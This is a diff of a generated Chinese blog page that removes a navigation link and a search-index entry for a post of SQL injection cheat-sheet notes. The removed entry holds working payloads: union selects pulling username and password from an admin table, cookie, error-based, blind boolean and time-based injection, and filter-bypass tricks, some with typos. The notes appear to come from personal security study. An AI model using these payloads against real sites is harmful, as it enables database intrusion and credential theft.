@@ -9,7 +9,7 @@
 <meta name="description" content="不断的折腾，才能领悟作死的真谛！！！">
 <meta name="theme-color" content="#000">
 <title>Hello Gridea | 破站真水</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1611840965445">
+<link rel="shortcut icon" href="/favicon.ico?v=1611841022579">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -212,7 +212,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-count">1</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -607,10 +607,6 @@
   </div>
   <div class="nav">
     <div class="nav-prev">
-      
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="速查篇[sql注入]：" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/">速查篇[sql注入]：</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="速查篇[sql注入]：" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/">上一篇</a>
       
     </div>
     <div class="nav-next">
@@ -1655,87 +1651,6 @@
       <hr>
     </div>
     <div class="result" id="result">
-      
-      <div class="item">
-        <a class="result-title" style="opacity: 0;" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/"" data-c="
-          &lt;p&gt;这篇是本人自己用来测试时候备忘速查的，可能写的很乱，各位看官不要介意哦，从简单到复杂，但不包括全部，是目前自己目前学习，详细的可以看我笔记&lt;br&gt;
-基础：Referer:访问b网站是来自于a网站，记录表示你从哪里来，&lt;br&gt;
-user-agent：显示你访问设备&lt;br&gt;
-x-forwarded-for:记录你的IP&lt;br&gt;
-字段：表中的列称为字段&lt;br&gt;
-记录：表中的行称为记录&lt;br&gt;
-+是%2b&lt;br&gt;
-在数据库里有一个系统库：information_schema&lt;br&gt;
-在它里面有个存着所有库名的表：schemata&lt;br&gt;
-schema_name 库名&lt;br&gt;
-在它里面有个存着所有表名的表：tables&lt;br&gt;
-表名&lt;br&gt;
-table_schema 表属于库&lt;br&gt;
-table_name  表名&lt;br&gt;
-在它里面还有个存着所有字段名的表：columns&lt;br&gt;
-table_schema 表属于库&lt;br&gt;
-table_name  表名&lt;br&gt;
-column_name 字段名&lt;br&gt;
-😕【access数据库】exists注入：&lt;br&gt;
-😀union select 1,2,3,4,5,6,7,8,9,10 from admin&lt;br&gt;
-【注：后面必须加一张表，此句作用判断一张表存不存在，而且不用and 1 =2，因为查询内容本来就在第一行】&lt;br&gt;
-😭and exists(select * from admin)&lt;br&gt;
-【注：exists()此句话判断admin存不存在，如果不存在，报错】&lt;br&gt;
-【要收集收集常见的表名，字段名】&lt;br&gt;
-🤡union select1，2，3，4，5，6，username，password，9，10 from admin&lt;br&gt;
-😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒&lt;br&gt;
-🙁【access数据库】cookie注入&lt;br&gt;
-【提交数据并非仅仅只有get\post这两种方式，还可以用cookie提交，对方可能对get\p6st这两种方式迸行拦截，现在判断是否可以通过cookie进行传参】&lt;br&gt;
-判断可不可以通过cookie传参：&lt;br&gt;
-按F12，打开存储，然后点cookie那块，然后将名称改为id 值改成171【例】，如果出现id=171界面就ok&lt;br&gt;
-😱id=171+order+by+10&lt;br&gt;
-😣id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin&lt;br&gt;
-😡id=171+union+select+1,2,3,4,5,6,,username,password,9,10+from+admin&lt;br&gt;
-【注：可以用modheader也可以用hackbar】&lt;br&gt;
-😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐&lt;br&gt;
-post注入：【网页在通过post传参时候，注入点在post数据包】&lt;br&gt;
-报错注入：把我们想要的内容篇以报错的形式展现出来&lt;br&gt;
-😲extractvalue():对XML文档进行查询的函数示出来语法: extractvalue(目标xml文档，xml路径)，路径不能出现非法路径，否则会报错，select extractvalue(1,0x7e)，写非法字符，或用十六进制&lt;br&gt;
-😑concat():将多个字符串连接成一个字符串语法:concat(str1, str2,...)&lt;br&gt;
-select concat(&#39;~&#39;,(select database()))&lt;br&gt;
-select extractvalue(1,concat(&#39;~&#39;,（select database())))&lt;br&gt;
-笔记详见burp测试：&lt;br&gt;
-如果碰到过滤可以un union ion select 1,2,3,4,5--adfa&lt;br&gt;
-a and nd extraactvalue(1,concat(0x7e,(seselectlct database()),0x7e))--adc&lt;br&gt;
-😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤&lt;br&gt;
-盲注：&lt;br&gt;
-布尔：length()函数返回字符串的长度?id=1 and length(database())&amp;gt;1可以大于号，小于号，等于号哦也可以使用大于等于和小于等于的方式&lt;br&gt;
-substr()截取字符串，从第一位截取一个&lt;br&gt;
-🤤?id=1 and substr(database(),1,1)=&#39;K&#39;【&amp;gt;,&amp;lt;可以用大于小于号，也可以使用ascii码如?id=1 and ord (substr(database() ,1，1))=107【ord()/ascii()返回字符的asciii码】&lt;br&gt;
-substr:第一位：1，1 第二位   2，1&lt;br&gt;
-limit:       0,1 ：从第一行起显示一条记录&lt;br&gt;
-时间：sleep()将程序挂起一段时间n为n秒&lt;br&gt;
-if(expr1,expr2,expr3)判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句&lt;br&gt;
-例如：?id=1&#39; and lf(length(database())=8,0,sleep(5))-- +&lt;br&gt;
-select if(1=2,3,4)    select if(1=1,3,4) if：1=2错误，给4，1=1正确，给3&lt;br&gt;
-实战：&lt;br&gt;
-猜解当前数据库名称长度:&lt;br&gt;
-and (length(database()79#企观看视频猜解当前数据库名称:&lt;br&gt;
-and (ascii(substr(database(),1,1)))=107返回正常，说明数据库名称第一位是k&lt;br&gt;
-and substr(database(),1,1)=&#39;k’返回正常，说明数据库名称第二位是k&lt;br&gt;
-猜表名:&lt;br&gt;
-and length((select table_name from information_schema.tables where table_schema=database()limit 0,1))=6返回正常，说明当前数据库第一个表长度是6&lt;br&gt;
-and substr((select table_name from information_schema.tables where table_schema=kanwolongxia&#39; limit 0,1),1,1)=I返回正常，说明数据库表名的第一个的第一位是l&lt;br&gt;
-猜字段名&lt;br&gt;
-and substr((select column_name from information_schema.columns where table_name=&amp;quot;oflag&amp;quot;limit0,1),1,1)=i&#39;返回正常，说明loflag表中的列名称第一位是i&lt;br&gt;
-猜内容&lt;br&gt;
-and (asci(substr(( select flaglo from loflag limit 0,1),1,1)=122返回正常，说明zKaQ列第一位是z&lt;br&gt;
-可以用burp爆破&lt;br&gt;
-☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️&lt;br&gt;
-head注入：&lt;br&gt;
-user_agent::判断访问设备，系统简称ua&lt;br&gt;
-插入进去：insert into 意思是擦汗如 beidiao是表，name，xingbie是位置，字段名，values后面紧跟这插入的内容&lt;br&gt;
-insert into beidiao(name,xingbie)values(&#39;heiyanquan&#39;,&#39;nan&#39;)&lt;br&gt;
-select updatexml(1,&#39;~&#39;,1)&lt;br&gt;
-select concat(&#39;~&#39;,(select database()))&lt;br&gt;
-select updatexml (1,concat(&#39;~&#39;,select database())),1)&lt;/p&gt;
-">速查篇[sql注入]：</a>
-      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://laoliang.shop/post/about/"" data-c="
